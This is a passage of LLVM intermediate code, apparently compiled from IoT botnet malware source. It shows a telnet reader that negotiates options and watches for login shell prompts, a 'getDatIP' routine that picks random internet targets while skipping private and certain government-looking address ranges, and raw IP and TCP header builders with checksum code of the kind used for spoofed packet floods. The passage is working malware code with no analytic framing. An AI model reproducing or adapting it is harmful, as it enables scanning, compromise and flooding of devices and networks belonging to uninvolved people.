  br i1 %96, label %97, label %98

97:                                               ; preds = %94, %83
  store i32 0, i32* %9, align 4
  br label %148

98:                                               ; preds = %94
  %99 = load i32, i32* %19, align 4
  %100 = load i32, i32* %18, align 4
  %101 = add nsw i32 %100, %99
  store i32 %101, i32* %18, align 4
  %102 = load i8*, i8** %23, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 255
  br i1 %105, label %106, label %128

106:                                              ; preds = %98
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 1
  %110 = call i64 @recv(i32 noundef %107, i8* noundef %109, i64 noundef 2, i32 noundef 0)
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %19, align 4
  %112 = load i32, i32* %19, align 4
  %113 = icmp eq i32 %112, -1
  br i1 %113, label %117, label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

117:                                              ; preds = %114, %106
  store i32 0, i32* %9, align 4
  br label %148

118:                                              ; preds = %114
  %119 = load i32, i32* %19, align 4
  %120 = load i32, i32* %18, align 4
  %121 = add nsw i32 %120, %119
  store i32 %121, i32* %18, align 4
  %122 = load i32, i32* %10, align 4
  %123 = load i8*, i8** %23, align 8
  %124 = call i32 @negotiate(i32 noundef %122, i8* noundef %123, i32 noundef 3)
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %127, label %126

126:                                              ; preds = %118
  store i32 0, i32* %9, align 4
  br label %148

127:                                              ; preds = %118
  br label %142

128:                                              ; preds = %98
  %129 = load i8*, i8** %15, align 8
  %130 = load i8*, i8** %11, align 8
  %131 = call i8* @strstr(i8* noundef %129, i8* noundef %130) #11
  %132 = icmp ne i8* %131, null
  br i1 %132, label %140, label %133

133:                                              ; preds = %128
  %134 = load i32, i32* %12, align 4
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %136, label %141

136:                                              ; preds = %133
  %137 = load i8*, i8** %15, align 8
  %138 = call i32 @matchPrompt(i8* noundef %137)
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %140, label %141

140:                                              ; preds = %136, %128
  store i32 1, i32* %20, align 4
  br label %143

141:                                              ; preds = %136, %133
  br label %142

142:                                              ; preds = %141, %127
  br label %33, !llvm.loop !40

143:                                              ; preds = %140, %82, %48
  %144 = load i32, i32* %20, align 4
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %146, label %147

146:                                              ; preds = %143
  store i32 1, i32* %9, align 4
  br label %148

147:                                              ; preds = %143
  store i32 0, i32* %9, align 4
  br label %148

148:                                              ; preds = %147, %146, %126, %117, %97
  %149 = load i32, i32* %9, align 4
  ret i32 %149
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getDatIP() #0 {
  %1 = alloca [4 x i8], align 1
  %2 = alloca [16 x i8], align 16
  %3 = bitcast [4 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 1 %3, i8 0, i64 4, i1 false)
  %4 = call i32 @rand() #12
  %5 = srem i32 %4, 255
  %6 = trunc i32 %5 to i8
  %7 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %6, i8* %7, align 1
  %8 = call i32 @rand() #12
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  %11 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %10, i8* %11, align 1
  %12 = call i32 @rand() #12
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  %15 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %14, i8* %15, align 1
  %16 = call i32 @rand() #12
  %17 = srem i32 %16, 255
  %18 = trunc i32 %17 to i8
  %19 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %18, i8* %19, align 1
  br label %20

20:                                               ; preds = %249, %0
  %21 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %247, label %25

25:                                               ; preds = %20
  %26 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 10
  br i1 %29, label %247, label %30

30:                                               ; preds = %25
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 100
  br i1 %34, label %35, label %45

35:                                               ; preds = %30
  %36 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp sge i32 %38, 64
  br i1 %39, label %40, label %45

40:                                               ; preds = %35
  %41 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp sle i32 %43, 127
  br i1 %44, label %247, label %45

45:                                               ; preds = %40, %35, %30
  %46 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 127
  br i1 %49, label %247, label %50

50:                                               ; preds = %45
  %51 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 169
  br i1 %54, label %55, label %60

55:                                               ; preds = %50
  %56 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 254
  br i1 %59, label %247, label %60

60:                                               ; preds = %55, %50
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 172
  br i1 %64, label %65, label %75

65:                                               ; preds = %60
  %66 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sle i32 %68, 16
  br i1 %69, label %70, label %75

70:                                               ; preds = %65
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp sle i32 %73, 31
  br i1 %74, label %247, label %75

75:                                               ; preds = %70, %65, %60
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp eq i32 %78, 192
  br i1 %79, label %80, label %90

80:                                               ; preds = %75
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %90

85:                                               ; preds = %80
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 2
  br i1 %89, label %247, label %90

90:                                               ; preds = %85, %80, %75
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %92 = load i8, i8* %91, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 192
  br i1 %94, label %95, label %105

95:                                               ; preds = %90
  %96 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %97 = load i8, i8* %96, align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 88
  br i1 %99, label %100, label %105

100:                                              ; preds = %95
  %101 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %102 = load i8, i8* %101, align 1
  %103 = zext i8 %102 to i32
  %104 = icmp eq i32 %103, 99
  br i1 %104, label %247, label %105

105:                                              ; preds = %100, %95, %90
  %106 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %107 = load i8, i8* %106, align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %115

110:                                              ; preds = %105
  %111 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %247, label %115

115:                                              ; preds = %110, %105
  %116 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 198
  br i1 %119, label %120, label %130

120:                                              ; preds = %115
  %121 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 18
  br i1 %124, label %247, label %125

125:                                              ; preds = %120
  %126 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %127 = load i8, i8* %126, align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 19
  br i1 %129, label %247, label %130

130:                                              ; preds = %125, %115
  %131 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %132 = load i8, i8* %131, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 198
  br i1 %134, label %135, label %145

135:                                              ; preds = %130
  %136 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 51
  br i1 %139, label %140, label %145

140:                                              ; preds = %135
  %141 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %142 = load i8, i8* %141, align 1
  %143 = zext i8 %142 to i32
  %144 = icmp eq i32 %143, 100
  br i1 %144, label %247, label %145

145:                                              ; preds = %140, %135, %130
  %146 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %147 = load i8, i8* %146, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 203
  br i1 %149, label %150, label %160

150:                                              ; preds = %145
  %151 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  br i1 %154, label %155, label %160

155:                                              ; preds = %150
  %156 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp eq i32 %158, 113
  br i1 %159, label %247, label %160

160:                                              ; preds = %155, %150, %145
  %161 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %162 = load i8, i8* %161, align 1
  %163 = zext i8 %162 to i32
  %164 = icmp eq i32 %163, 62
  br i1 %164, label %165, label %170

165:                                              ; preds = %160
  %166 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %167 = load i8, i8* %166, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp sle i32 %168, 30
  br i1 %169, label %247, label %170

170:                                              ; preds = %165, %160
  %171 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 207
  br i1 %174, label %175, label %185

175:                                              ; preds = %170
  %176 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp sge i32 %178, 31
  br i1 %179, label %180, label %185

180:                                              ; preds = %175
  %181 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp sle i32 %183, 120
  br i1 %184, label %247, label %185

185:                                              ; preds = %180, %175, %170
  %186 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %187 = load i8, i8* %186, align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 65
  br i1 %189, label %190, label %200

190:                                              ; preds = %185
  %191 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp sge i32 %193, 224
  br i1 %194, label %195, label %200

195:                                              ; preds = %190
  %196 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %197 = load i8, i8* %196, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp sle i32 %198, 226
  br i1 %199, label %247, label %200

200:                                              ; preds = %195, %190, %185
  %201 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 195
  br i1 %204, label %205, label %210

205:                                              ; preds = %200
  %206 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 10
  br i1 %209, label %247, label %210

210:                                              ; preds = %205, %200
  %211 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %212 = load i8, i8* %211, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 216
  br i1 %214, label %215, label %225

215:                                              ; preds = %210
  %216 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %217 = load i8, i8* %216, align 1
  %218 = zext i8 %217 to i32
  %219 = icmp eq i32 %218, 25
  br i1 %219, label %247, label %220

220:                                              ; preds = %215
  %221 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 94
  br i1 %224, label %247, label %225

225:                                              ; preds = %220, %210
  %226 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %227 = load i8, i8* %226, align 1
  %228 = zext i8 %227 to i32
  %229 = icmp eq i32 %228, 212
  br i1 %229, label %230, label %235

230:                                              ; preds = %225
  %231 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %232 = load i8, i8* %231, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 56
  br i1 %234, label %247, label %235

235:                                              ; preds = %230, %225
  %236 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %237 = load i8, i8* %236, align 1
  %238 = zext i8 %237 to i32
  %239 = icmp sge i32 %238, 224
  br i1 %239, label %240, label %245

240:                                              ; preds = %235
  %241 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %242 = load i8, i8* %241, align 1
  %243 = zext i8 %242 to i32
  %244 = icmp sle i32 %243, 239
  br label %245

245:                                              ; preds = %240, %235
  %246 = phi i1 [ false, %235 ], [ %244, %240 ]
  br label %247

247:                                              ; preds = %245, %230, %220, %215, %205, %195, %180, %165, %155, %140, %125, %120, %110, %100, %85, %70, %55, %45, %40, %25, %20
  %248 = phi i1 [ true, %230 ], [ true, %220 ], [ true, %215 ], [ true, %205 ], [ true, %195 ], [ true, %180 ], [ true, %165 ], [ true, %155 ], [ true, %140 ], [ true, %125 ], [ true, %120 ], [ true, %110 ], [ true, %100 ], [ true, %85 ], [ true, %70 ], [ true, %55 ], [ true, %45 ], [ true, %40 ], [ true, %25 ], [ true, %20 ], [ %246, %245 ]
  br i1 %248, label %249, label %266

249:                                              ; preds = %247
  %250 = call i32 @rand() #12
  %251 = srem i32 %250, 255
  %252 = trunc i32 %251 to i8
  %253 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  store i8 %252, i8* %253, align 1
  %254 = call i32 @rand() #12
  %255 = srem i32 %254, 255
  %256 = trunc i32 %255 to i8
  %257 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  store i8 %256, i8* %257, align 1
  %258 = call i32 @rand() #12
  %259 = srem i32 %258, 255
  %260 = trunc i32 %259 to i8
  %261 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  store i8 %260, i8* %261, align 1
  %262 = call i32 @rand() #12
  %263 = srem i32 %262, 255
  %264 = trunc i32 %263 to i8
  %265 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  store i8 %264, i8* %265, align 1
  br label %20, !llvm.loop !41

266:                                              ; preds = %247
  %267 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %267, i8 0, i64 16, i1 false)
  %268 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %269 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 0
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 1
  %273 = load i8, i8* %272, align 1
  %274 = zext i8 %273 to i32
  %275 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 2
  %276 = load i8, i8* %275, align 1
  %277 = zext i8 %276 to i32
  %278 = getelementptr inbounds [4 x i8], [4 x i8]* %1, i64 0, i64 3
  %279 = load i8, i8* %278, align 1
  %280 = zext i8 %279 to i32
  %281 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %268, i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.311, i64 0, i64 0), i32 noundef %271, i32 noundef %274, i32 noundef %277, i32 noundef %280) #12
  %282 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i64 0, i64 0
  %283 = call i32 @inet_addr(i8* noundef %282) #12
  ret i32 %283
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: nounwind
declare i32 @sprintf(i8* noundef, i8* noundef, ...) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @csum(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i32
  %14 = load i32, i32* %5, align 4
  %15 = add nsw i32 %14, %13
  store i32 %15, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !42

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = load i32, i32* %5, align 4
  %27 = add nsw i32 %26, %25
  store i32 %27, i32* %5, align 4
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i32, i32* %5, align 4
  %31 = ashr i32 %30, 16
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i32, i32* %5, align 4
  %35 = and i32 %34, 65535
  %36 = load i32, i32* %5, align 4
  %37 = ashr i32 %36, 16
  %38 = add nsw i32 %35, %37
  store i32 %38, i32* %5, align 4
  br label %29, !llvm.loop !43

39:                                               ; preds = %29
  %40 = load i32, i32* %5, align 4
  %41 = xor i32 %40, -1
  %42 = trunc i32 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* noundef %0, %struct.tcphdr* noundef %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 noundef zeroext 20) #15
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 noundef %28) #12
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %32, i8* align 8 %33, i64 24, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %36, i8* align 1 %38, i64 20, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* noundef %39, i32 noundef %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* noundef %43) #12
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #9

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeIPPacket(%struct.iphdr* noundef %0, i32 noundef %1, i32 noundef %2, i8 noundef zeroext %3, i32 noundef %4) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @sclose(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

6:                                                ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

7:                                                ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 noundef %8)
  store i32 0, i32* %2, align 4
  br label %10

10:                                               ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @mygethostbyname(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca %struct.addrinfo, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca %struct.addrinfo*, align 8
  %8 = alloca %struct.sockaddr_in*, align 8
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 1
  store i32 2, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %5, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = load i8*, i8** %3, align 8
  %14 = call i32 @getaddrinfo(i8* noundef %13, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.312, i64 0, i64 0), %struct.addrinfo* noundef %5, %struct.addrinfo** noundef %6)
  store i32 %14, i32* %9, align 4
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.313, i64 0, i64 0), i8** %2, align 8
  br label %38

17:                                               ; preds = %1
  %18 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  store %struct.addrinfo* %18, %struct.addrinfo** %7, align 8
  br label %19

19:                                               ; preds = %32, %17
  %20 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %21 = icmp ne %struct.addrinfo* %20, null
  br i1 %21, label %22, label %36

22:                                               ; preds = %19
  %23 = load %struct.addrinfo*, %struct.addrinfo** %7, align 8
  %24 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %23, i32 0, i32 5
  %25 = load %struct.sockaddr*, %struct.sockaddr** %24, align 8
  %26 = bitcast %struct.sockaddr* %25 to %struct.sockaddr_in*
  store %struct.sockaddr_in* %26, %struct.sockaddr_in** %8, align 8
  %27 = load %struct.sockaddr_in*, %struct.sockaddr_in** %8, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
